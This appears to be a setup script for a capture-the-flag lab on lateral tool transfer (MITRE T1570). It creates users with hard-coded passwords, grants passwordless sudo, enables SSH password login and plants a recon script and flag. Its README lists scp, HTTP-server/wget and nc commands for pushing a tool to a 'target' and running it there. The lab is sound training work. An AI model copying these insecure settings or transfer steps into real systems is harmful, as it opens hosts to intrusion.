#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{LATERAL_TOOL_TRANSFER_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-lm3; chmod 440 /etc/sudoers.d/player-lm3
TARGET="staging_srv"; TPASS="Staging@99!"
id "$TARGET" &>/dev/null || { useradd -m -s /bin/bash "$TARGET"; echo "$TARGET:$TPASS"|chpasswd; }
mkdir -p /root/.flags && chmod 700 /root/.flags
echo "$FLAG" > /root/.flags/flag.txt && chmod 644 /root/.flags/flag.txt
# Create a "tool" that player must transfer and execute on "remote" host
cat > /tmp/recon_tool.sh << 'TOOLEOF'
#!/bin/bash
echo "[*] Recon tool running on $(hostname) as $(id)"
echo "[*] Network: $(ip a | grep 'inet ' | awk '{print $2}')"
cat /root/.flags/flag.txt 2>/dev/null || echo "[!] Flag requires elevated access"
TOOLEOF
chmod 755 /tmp/recon_tool.sh
sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
grep -q "^PasswordAuthentication" /etc/ssh/sshd_config || echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl restart ssh 2>/dev/null || service ssh restart 2>/dev/null || true
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1570 Lateral Tool Transfer ===
Login  : player / Player@123
Goal   : Transfer an attack tool from "attacker" to "target" host and execute it.
         1. Transfer /tmp/recon_tool.sh to staging_srv@localhost (password: Staging@99!)
            Methods: scp, sftp, nc, curl, python HTTP server
         2. Execute it on the "remote" host via SSH
         3. Retrieve the flag
Methods: scp /tmp/recon_tool.sh staging_srv@localhost:/tmp/
         python3 -m http.server 8080 (then wget on target)
         nc -l 4444 < file  /  nc attacker 4444 > file
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1570-A setup complete."
